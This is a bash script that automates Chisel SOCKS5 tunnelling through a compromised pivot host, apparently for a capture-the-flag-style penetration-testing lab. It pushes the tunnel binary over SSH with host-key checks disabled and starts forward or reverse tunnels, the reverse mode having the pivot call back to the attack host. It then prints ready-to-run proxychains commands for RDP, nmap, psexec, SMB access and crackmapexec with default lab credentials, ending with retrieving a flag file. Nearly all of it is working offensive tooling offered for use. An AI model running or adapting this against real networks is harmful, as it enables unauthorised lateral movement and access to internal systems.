#!/bin/bash

#═══════════════════════════════════════════════════════════════════════════════
#  CHISEL SOCKS5 TUNNEL AUTOMATION SCRIPT
#  For Penetration Testing Engagements
#═══════════════════════════════════════════════════════════════════════════════

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# Global Variables
WORK_DIR="$HOME/chisel-workspace"
CHISEL_BIN=""
CHISEL_PORT="1234"
SOCKS_PORT="1080"
TUNNEL_MODE=""  # "forward" or "reverse"
PROXYCHAINS_CONF="/etc/proxychains4.conf"

# Banner
print_banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║      ____ _   _ ___ ____  _____ _                                 ║
    ║     / ___| | | |_ _/ ___|| ____| |                                ║
    ║    | |   | |_| || |\___ \|  _| | |                                ║
    ║    | |___|  _  || | ___) | |___| |___                             ║
    ║     \____|_| |_|___|____/|_____|_____|                            ║
    ║                                                                   ║
    ║         SOCKS5 TUNNEL AUTOMATION SCRIPT                           ║
    ║              TCP/UDP over HTTP/SSH                                ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Logging functions
log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_input() { echo -e "${MAGENTA}[?]${NC} $1"; }
log_cmd() { echo -e "${DIM}    └─▶ ${NC}${GREEN}$1${NC}"; }

separator() {
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

header() {
    separator
    echo -e "${BOLD}${WHITE}$1${NC}"
    separator
}

# Detect network configuration
detect_network() {
    log_info "Detecting network configuration..."
    
    # Try VPN interfaces first (common for HTB)
    for iface in tun0 tun1 tap0; do
        LOCAL_IP=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)
        [[ -n "$LOCAL_IP" ]] && break
    done
    
    # Fallback to default route interface
    if [[ -z "$LOCAL_IP" ]]; then
        DEFAULT_IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
        LOCAL_IP=$(ip -4 addr show "$DEFAULT_IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)
    fi
    
    if [[ -n "$LOCAL_IP" ]]; then
        log_success "Detected Attack Host IP: $LOCAL_IP"
        read -rp "Use this IP? [Y/n]: " confirm
        [[ "$confirm" =~ ^[Nn] ]] && read -rp "Enter your IP: " LOCAL_IP
    else
        read -rp "Enter your attack host IP: " LOCAL_IP
    fi
}

# Get target information
get_target_info() {
    header "TARGET CONFIGURATION"
    
    read -rp "Pivot Host IP (SSH target): " PIVOT_IP
    read -rp "Pivot SSH Username [ubuntu]: " PIVOT_USER
    PIVOT_USER=${PIVOT_USER:-ubuntu}
    read -rsp "Pivot SSH Password: " PIVOT_PASS
    echo
    
    echo
    log_info "Internal target (accessible via pivot):"
    read -rp "Internal Target IP [172.16.5.19]: " INTERNAL_IP
    INTERNAL_IP=${INTERNAL_IP:-172.16.5.19}
    read -rp "Internal Target Username [victor]: " INTERNAL_USER
    INTERNAL_USER=${INTERNAL_USER:-victor}
    read -rsp "Internal Target Password [pass@123]: " INTERNAL_PASS
    INTERNAL_PASS=${INTERNAL_PASS:-pass@123}
    echo
    
    read -rp "Chisel Port [1234]: " CHISEL_PORT
    CHISEL_PORT=${CHISEL_PORT:-1234}
    read -rp "SOCKS5 Port [1080]: " SOCKS_PORT
    SOCKS_PORT=${SOCKS_PORT:-1080}
}

# Select tunnel mode
select_tunnel_mode() {
    header "TUNNEL MODE SELECTION"
    
    echo -e "${CYAN}Choose tunneling mode:${NC}"
    echo
    echo -e "  ${GREEN}1) Forward Tunnel${NC} (Default)"
    echo -e "     └─ Server runs on ${YELLOW}PIVOT HOST${NC}"
    echo -e "     └─ Client connects from ${YELLOW}ATTACK HOST${NC}"
    echo -e "     └─ Use when: Pivot host accepts inbound connections"
    echo
    echo -e "  ${GREEN}2) Reverse Tunnel${NC}"
    echo -e "     └─ Server runs on ${YELLOW}ATTACK HOST${NC}"
    echo -e "     └─ Client connects from ${YELLOW}PIVOT HOST${NC}"
    echo -e "     └─ Use when: Firewall blocks inbound to pivot"
    echo
    read -rp "Select mode [1/2]: " mode_choice
    
    case $mode_choice in
        2) TUNNEL_MODE="reverse" ;;
        *) TUNNEL_MODE="forward" ;;
    esac
    
    log_success "Selected: ${TUNNEL_MODE^^} tunnel mode"
}

# Setup workspace and get chisel binary
setup_chisel() {
    header "CHISEL BINARY SETUP"
    
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR"
    
    # Check if chisel already exists
    if [[ -f "$WORK_DIR/chisel" ]]; then
        log_success "Chisel binary found: $WORK_DIR/chisel"
        CHISEL_BIN="$WORK_DIR/chisel"
        chmod +x "$CHISEL_BIN"
        return
    fi
    
    # Check system chisel
    if command -v chisel &>/dev/null; then
        CHISEL_BIN=$(which chisel)
        log_success "System chisel found: $CHISEL_BIN"
        return
    fi
    
    echo -e "${CYAN}Chisel not found. Choose installation method:${NC}"
    echo -e "  ${GREEN}1)${NC} Download pre-built binary (Recommended)"
    echo -e "  ${GREEN}2)${NC} Clone and build from source"
    echo -e "  ${GREEN}3)${NC} Specify existing binary path"
    echo
    read -rp "Select option [1]: " install_choice
    
    case $install_choice in
        2)
            log_info "Cloning and building chisel..."
            if ! command -v go &>/dev/null; then
                log_error "Go is not installed. Install with: sudo apt install golang-go"
                exit 1
            fi
            git clone https://github.com/jpillora/chisel.git chisel-src 2>/dev/null
            cd chisel-src
            go build -ldflags="-s -w" -o ../chisel
            cd ..
            rm -rf chisel-src
            CHISEL_BIN="$WORK_DIR/chisel"
            log_success "Chisel built: $CHISEL_BIN"
            ;;
        3)
            read -rp "Enter path to chisel binary: " CHISEL_BIN
            if [[ ! -f "$CHISEL_BIN" ]]; then
                log_error "Binary not found: $CHISEL_BIN"
                exit 1
            fi
            ;;
        *)
            log_info "Downloading pre-built chisel binary..."
            # Get latest release
            LATEST=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | grep -oP '"tag_name": "\K[^"]+')
            ARCH="amd64"
            [[ $(uname -m) == "aarch64" ]] && ARCH="arm64"
            
            DOWNLOAD_URL="https://github.com/jpillora/chisel/releases/download/${LATEST}/chisel_${LATEST#v}_linux_${ARCH}.gz"
            log_info "Downloading: $DOWNLOAD_URL"
            
            curl -sL "$DOWNLOAD_URL" -o chisel.gz
            gunzip -f chisel.gz
            chmod +x chisel
            CHISEL_BIN="$WORK_DIR/chisel"
            log_success "Downloaded chisel ${LATEST}: $CHISEL_BIN"
            ;;
    esac
    
    # Verify binary
    if ! "$CHISEL_BIN" --help &>/dev/null; then
        log_error "Chisel binary verification failed"
        exit 1
    fi
    
    # Show binary size
    SIZE=$(du -h "$CHISEL_BIN" | cut -f1)
    log_info "Binary size: $SIZE"
}

# Transfer chisel to pivot host
transfer_to_pivot() {
    header "TRANSFERRING CHISEL TO PIVOT HOST"
    
    log_info "Transferring chisel binary to $PIVOT_USER@$PIVOT_IP..."
    
    # Use sshpass if available, otherwise prompt
    if command -v sshpass &>/dev/null; then
        sshpass -p "$PIVOT_PASS" scp -o StrictHostKeyChecking=no "$CHISEL_BIN" "$PIVOT_USER@$PIVOT_IP:~/chisel"
    else
        log_warning "sshpass not installed. You'll need to enter password manually."
        scp -o StrictHostKeyChecking=no "$CHISEL_BIN" "$PIVOT_USER@$PIVOT_IP:~/chisel"
    fi
    
    log_success "Chisel transferred to pivot host"
    
    # Make executable on remote
    if command -v sshpass &>/dev/null; then
        sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no "$PIVOT_USER@$PIVOT_IP" "chmod +x ~/chisel"
    else
        ssh -o StrictHostKeyChecking=no "$PIVOT_USER@$PIVOT_IP" "chmod +x ~/chisel"
    fi
    
    log_success "Binary made executable on pivot host"
}

# Configure proxychains
configure_proxychains() {
    header "CONFIGURING PROXYCHAINS"
    
    # Find proxychains config
    for conf in /etc/proxychains4.conf /etc/proxychains.conf; do
        [[ -f "$conf" ]] && PROXYCHAINS_CONF="$conf" && break
    done
    
    if [[ ! -f "$PROXYCHAINS_CONF" ]]; then
        log_warning "Proxychains config not found. Install with: sudo apt install proxychains4"
        return
    fi
    
    log_info "Configuring $PROXYCHAINS_CONF..."
    
    # Backup original
    sudo cp "$PROXYCHAINS_CONF" "${PROXYCHAINS_CONF}.bak" 2>/dev/null || true
    
    # Check if already configured
    if grep -q "socks5.*127.0.0.1.*$SOCKS_PORT" "$PROXYCHAINS_CONF" 2>/dev/null; then
        log_success "Proxychains already configured for port $SOCKS_PORT"
    else
        # Comment out existing socks entries and add new one
        sudo sed -i 's/^socks[45]/#&/' "$PROXYCHAINS_CONF"
        echo "socks5 127.0.0.1 $SOCKS_PORT" | sudo tee -a "$PROXYCHAINS_CONF" > /dev/null
        log_success "Added socks5 127.0.0.1 $SOCKS_PORT to proxychains config"
    fi
    
    # Show current config
    echo
    log_info "Current proxy configuration:"
    grep -v "^#" "$PROXYCHAINS_CONF" | grep -E "socks|proxy" | tail -5
}

# Start forward tunnel
start_forward_tunnel() {
    header "STARTING FORWARD TUNNEL"
    
    echo -e "${CYAN}Architecture:${NC}"
    echo -e "  Attack Host ──────▶ Pivot Host ──────▶ Internal Network"
    echo -e "  (Client)            (Server)           (172.16.5.0/23)"
    echo -e "  :$SOCKS_PORT ◀────────── :$CHISEL_PORT"
    echo
    
    # Command for pivot host (server)
    PIVOT_CMD="./chisel server -v -p $CHISEL_PORT --socks5"
    
    # Command for attack host (client)
    CLIENT_CMD="$CHISEL_BIN client -v $PIVOT_IP:$CHISEL_PORT socks"
    
    log_info "Step 1: Starting Chisel SERVER on pivot host..."
    log_cmd "$PIVOT_CMD"
    
    # Start server on pivot via SSH
    if command -v sshpass &>/dev/null; then
        sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -f "$PIVOT_USER@$PIVOT_IP" \
            "nohup ./chisel server -v -p $CHISEL_PORT --socks5 > /tmp/chisel.log 2>&1 &"
    else
        ssh -o StrictHostKeyChecking=no -f "$PIVOT_USER@$PIVOT_IP" \
            "nohup ./chisel server -v -p $CHISEL_PORT --socks5 > /tmp/chisel.log 2>&1 &"
    fi
    
    sleep 2
    log_success "Chisel server started on pivot host"
    
    log_info "Step 2: Starting Chisel CLIENT on attack host..."
    log_cmd "$CLIENT_CMD"
    
    # Start client locally
    $CHISEL_BIN client -v "$PIVOT_IP:$CHISEL_PORT" socks > "$WORK_DIR/client.log" 2>&1 &
    CLIENT_PID=$!
    echo $CLIENT_PID > "$WORK_DIR/client.pid"
    
    sleep 2
    
    # Verify tunnel
    if kill -0 $CLIENT_PID 2>/dev/null; then
        log_success "Chisel client started (PID: $CLIENT_PID)"
        log_success "SOCKS5 proxy listening on 127.0.0.1:$SOCKS_PORT"
    else
        log_error "Client failed to start. Check $WORK_DIR/client.log"
        cat "$WORK_DIR/client.log"
        return 1
    fi
}

# Start reverse tunnel
start_reverse_tunnel() {
    header "STARTING REVERSE TUNNEL"
    
    echo -e "${CYAN}Architecture:${NC}"
    echo -e "  Attack Host ◀────── Pivot Host ──────▶ Internal Network"
    echo -e "  (Server)            (Client)           (172.16.5.0/23)"
    echo -e "  :$CHISEL_PORT ◀──────────"
    echo -e "  :$SOCKS_PORT (SOCKS5)"
    echo
    
    # Command for attack host (server)
    SERVER_CMD="$CHISEL_BIN server --reverse -v -p $CHISEL_PORT --socks5"
    
    # Command for pivot host (client)
    PIVOT_CMD="./chisel client -v $LOCAL_IP:$CHISEL_PORT R:socks"
    
    log_info "Step 1: Starting Chisel SERVER on attack host..."
    log_cmd "$SERVER_CMD"
    
    # Start server locally
    sudo $CHISEL_BIN server --reverse -v -p $CHISEL_PORT --socks5 > "$WORK_DIR/server.log" 2>&1 &
    SERVER_PID=$!
    echo $SERVER_PID > "$WORK_DIR/server.pid"
    
    sleep 2
    
    if ! kill -0 $SERVER_PID 2>/dev/null; then
        log_error "Server failed to start. Check $WORK_DIR/server.log"
        return 1
    fi
    log_success "Chisel server started (PID: $SERVER_PID)"
    
    log_info "Step 2: Starting Chisel CLIENT on pivot host..."
    log_cmd "$PIVOT_CMD"
    
    # Start client on pivot via SSH
    if command -v sshpass &>/dev/null; then
        sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -f "$PIVOT_USER@$PIVOT_IP" \
            "nohup ./chisel client -v $LOCAL_IP:$CHISEL_PORT R:socks > /tmp/chisel.log 2>&1 &"
    else
        ssh -o StrictHostKeyChecking=no -f "$PIVOT_USER@$PIVOT_IP" \
            "nohup ./chisel client -v $LOCAL_IP:$CHISEL_PORT R:socks > /tmp/chisel.log 2>&1 &"
    fi
    
    sleep 3
    log_success "Chisel client started on pivot host"
    log_success "SOCKS5 proxy listening on 127.0.0.1:$SOCKS_PORT"
}

# Verify tunnel is working
verify_tunnel() {
    header "VERIFYING TUNNEL"
    
    log_info "Checking SOCKS5 proxy on port $SOCKS_PORT..."
    
    if ss -tlnp | grep -q ":$SOCKS_PORT"; then
        log_success "SOCKS5 port $SOCKS_PORT is listening"
    else
        log_warning "Port $SOCKS_PORT not detected. Tunnel may still be initializing..."
        sleep 2
    fi
    
    # Test connection through proxy if curl supports it
    log_info "Testing proxy connectivity..."
    if timeout 5 proxychains -q curl -s --max-time 3 "http://$INTERNAL_IP" &>/dev/null; then
        log_success "Proxy connectivity verified!"
    else
        log_warning "Could not verify connectivity (target may not have HTTP open)"
    fi
}

# Generate usage commands
show_usage_commands() {
    header "USAGE COMMANDS - COPY & PASTE"
    
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  RDP TO INTERNAL TARGET                                             │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────────────┘${NC}"
    
    RDP_CMD="proxychains xfreerdp /v:$INTERNAL_IP /u:$INTERNAL_USER /p:'$INTERNAL_PASS' /cert:ignore /dynamic-resolution"
    echo -e "${GREEN}$RDP_CMD${NC}"
    echo
    
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  SSH TO INTERNAL TARGET                                             │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────────────┘${NC}"
    
    SSH_CMD="proxychains ssh $INTERNAL_USER@$INTERNAL_IP"
    echo -e "${GREEN}$SSH_CMD${NC}"
    echo
    
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  NMAP THROUGH TUNNEL                                                │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────────────┘${NC}"
    
    NMAP_CMD="proxychains nmap -sT -Pn -p 21,22,80,135,139,445,3389 $INTERNAL_IP"
    echo -e "${GREEN}$NMAP_CMD${NC}"
    echo
    
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  CURL / WEB REQUESTS                                                │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────────────┘${NC}"
    
    CURL_CMD="proxychains curl http://$INTERNAL_IP"
    echo -e "${GREEN}$CURL_CMD${NC}"
    echo
    
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  IMPACKET TOOLS                                                     │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────────────┘${NC}"
    
    echo -e "${GREEN}proxychains impacket-psexec $INTERNAL_USER:'$INTERNAL_PASS'@$INTERNAL_IP${NC}"
    echo -e "${GREEN}proxychains impacket-smbclient $INTERNAL_USER:'$INTERNAL_PASS'@$INTERNAL_IP${NC}"
    echo -e "${GREEN}proxychains crackmapexec smb $INTERNAL_IP -u $INTERNAL_USER -p '$INTERNAL_PASS'${NC}"
    echo
    
    # Save to file
    CMDS_FILE="$WORK_DIR/tunnel_commands.txt"
    cat > "$CMDS_FILE" << EOF
================================================================================
CHISEL TUNNEL COMMANDS - Generated $(date)
================================================================================

TUNNEL INFO:
  Mode: ${TUNNEL_MODE^^}
  Pivot Host: $PIVOT_IP
  Internal Target: $INTERNAL_IP
  SOCKS5 Proxy: 127.0.0.1:$SOCKS_PORT

--------------------------------------------------------------------------------
RDP TO INTERNAL TARGET
--------------------------------------------------------------------------------
$RDP_CMD

--------------------------------------------------------------------------------
SSH TO INTERNAL TARGET
--------------------------------------------------------------------------------
$SSH_CMD

--------------------------------------------------------------------------------
NMAP THROUGH TUNNEL
--------------------------------------------------------------------------------
$NMAP_CMD

--------------------------------------------------------------------------------
SMB ENUMERATION
--------------------------------------------------------------------------------
proxychains crackmapexec smb $INTERNAL_IP -u $INTERNAL_USER -p '$INTERNAL_PASS'
proxychains impacket-smbclient $INTERNAL_USER:'$INTERNAL_PASS'@$INTERNAL_IP

--------------------------------------------------------------------------------
FILE TRANSFER (SMB)
--------------------------------------------------------------------------------
proxychains impacket-smbclient $INTERNAL_USER:'$INTERNAL_PASS'@$INTERNAL_IP
# Then: get Users\\victor\\Documents\\flag.txt

================================================================================
EOF
    
    log_success "Commands saved to: $CMDS_FILE"
}

# Quick RDP function
quick_rdp() {
    log_info "Launching RDP to $INTERNAL_IP..."
    proxychains xfreerdp /v:"$INTERNAL_IP" /u:"$INTERNAL_USER" /p:"$INTERNAL_PASS" /cert:ignore /dynamic-resolution &
}

# Stop tunnel
stop_tunnel() {
    header "STOPPING TUNNEL"
    
    # Kill local processes
    for pidfile in "$WORK_DIR"/*.pid; do
        if [[ -f "$pidfile" ]]; then
            PID=$(cat "$pidfile")
            if kill -0 "$PID" 2>/dev/null; then
                sudo kill "$PID" 2>/dev/null || true
                log_info "Killed local process: $PID"
            fi
            rm -f "$pidfile"
        fi
    done
    
    # Kill chisel processes
    pkill -f "chisel" 2>/dev/null || true
    
    # Kill on pivot
    if [[ -n "$PIVOT_IP" ]] && [[ -n "$PIVOT_USER" ]]; then
        log_info "Stopping chisel on pivot host..."
        if command -v sshpass &>/dev/null && [[ -n "$PIVOT_PASS" ]]; then
            sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no "$PIVOT_USER@$PIVOT_IP" \
                "pkill -f chisel" 2>/dev/null || true
        fi
    fi
    
    log_success "Tunnel stopped"
}

# Show tunnel status
show_status() {
    header "TUNNEL STATUS"
    
    # Check local processes
    echo -e "${CYAN}Local Chisel Processes:${NC}"
    pgrep -a chisel 2>/dev/null || echo "  None running"
    echo
    
    # Check SOCKS port
    echo -e "${CYAN}SOCKS5 Proxy Port ($SOCKS_PORT):${NC}"
    if ss -tlnp | grep -q ":$SOCKS_PORT"; then
        echo -e "  ${GREEN}● LISTENING${NC}"
        ss -tlnp | grep ":$SOCKS_PORT"
    else
        echo -e "  ${RED}○ NOT LISTENING${NC}"
    fi
    echo
    
    # Check pivot if configured
    if [[ -n "$PIVOT_IP" ]]; then
        echo -e "${CYAN}Pivot Host ($PIVOT_IP):${NC}"
        if command -v sshpass &>/dev/null && [[ -n "$PIVOT_PASS" ]]; then
            REMOTE_CHISEL=$(sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                "$PIVOT_USER@$PIVOT_IP" "pgrep -a chisel" 2>/dev/null)
            if [[ -n "$REMOTE_CHISEL" ]]; then
                echo -e "  ${GREEN}● RUNNING${NC}"
                echo "  $REMOTE_CHISEL"
            else
                echo -e "  ${RED}○ NOT RUNNING${NC}"
            fi
        else
            echo "  (Cannot check without sshpass/password)"
        fi
    fi
}

# Interactive menu
interactive_menu() {
    while true; do
        separator
        echo -e "${BOLD}${WHITE}CHISEL TUNNEL CONTROL PANEL${NC}"
        separator
        echo -e "  ${CYAN}1)${NC} Show usage commands"
        echo -e "  ${CYAN}2)${NC} Quick RDP to internal target"
        echo -e "  ${CYAN}3)${NC} Show tunnel status"
        echo -e "  ${CYAN}4)${NC} Restart tunnel"
        echo -e "  ${CYAN}5)${NC} Stop tunnel"
        echo -e "  ${CYAN}6)${NC} Reconfigure with new targets"
        echo -e "  ${CYAN}7)${NC} View logs"
        echo -e "  ${CYAN}8)${NC} Copy RDP command to clipboard"
        echo -e "  ${CYAN}q)${NC} Quit"
        echo
        
        # Quick status
        if ss -tlnp 2>/dev/null | grep -q ":$SOCKS_PORT"; then
            echo -e "  ${GREEN}● Tunnel Status: ACTIVE (SOCKS5 :$SOCKS_PORT)${NC}"
        else
            echo -e "  ${RED}○ Tunnel Status: INACTIVE${NC}"
        fi
        echo
        
        read -rp "Select option: " choice
        
        case $choice in
            1) show_usage_commands ;;
            2) quick_rdp ;;
            3) show_status ;;
            4) 
                stop_tunnel
                sleep 1
                [[ "$TUNNEL_MODE" == "reverse" ]] && start_reverse_tunnel || start_forward_tunnel
                ;;
            5) stop_tunnel ;;
            6) 
                stop_tunnel
                get_target_info
                select_tunnel_mode
                transfer_to_pivot
                [[ "$TUNNEL_MODE" == "reverse" ]] && start_reverse_tunnel || start_forward_tunnel
                ;;
            7)
                for log in "$WORK_DIR"/*.log; do
                    [[ -f "$log" ]] && echo -e "\n${CYAN}=== $log ===${NC}" && tail -20 "$log"
                done
                ;;
            8)
                if command -v xclip &>/dev/null; then
                    echo "proxychains xfreerdp /v:$INTERNAL_IP /u:$INTERNAL_USER /p:'$INTERNAL_PASS' /cert:ignore" | xclip -selection clipboard
                    log_success "RDP command copied to clipboard!"
                else
                    log_warning "xclip not installed"
                fi
                ;;
            q|Q)
                read -rp "Stop tunnel before exiting? [Y/n]: " stop_first
                [[ ! "$stop_first" =~ ^[Nn] ]] && stop_tunnel
                exit 0
                ;;
            *) log_warning "Invalid option" ;;
        esac
    done
}

# Main execution
main() {
    clear
    print_banner
    
    # Check for required tools
    for tool in ssh scp; do
        if ! command -v "$tool" &>/dev/null; then
            log_error "Required tool not found: $tool"
            exit 1
        fi
    done
    
    # Check for optional but recommended tools
    for tool in proxychains sshpass; do
        command -v "$tool" &>/dev/null || log_warning "$tool not installed (recommended)"
    done
    
    detect_network
    get_target_info
    select_tunnel_mode
    setup_chisel
    transfer_to_pivot
    configure_proxychains
    
    # Start appropriate tunnel
    if [[ "$TUNNEL_MODE" == "reverse" ]]; then
        start_reverse_tunnel
    else
        start_forward_tunnel
    fi
    
    verify_tunnel
    show_usage_commands
    
    echo
    read -rp "Launch RDP to internal target now? [Y/n]: " launch_rdp
    [[ ! "$launch_rdp" =~ ^[Nn] ]] && quick_rdp
    
    echo
    read -rp "Enter interactive control panel? [Y/n]: " panel
    [[ ! "$panel" =~ ^[Nn] ]] && interactive_menu
}

# Handle Ctrl+C
trap 'echo; log_warning "Interrupted"; exit 130' INT

# Run
main "$@"
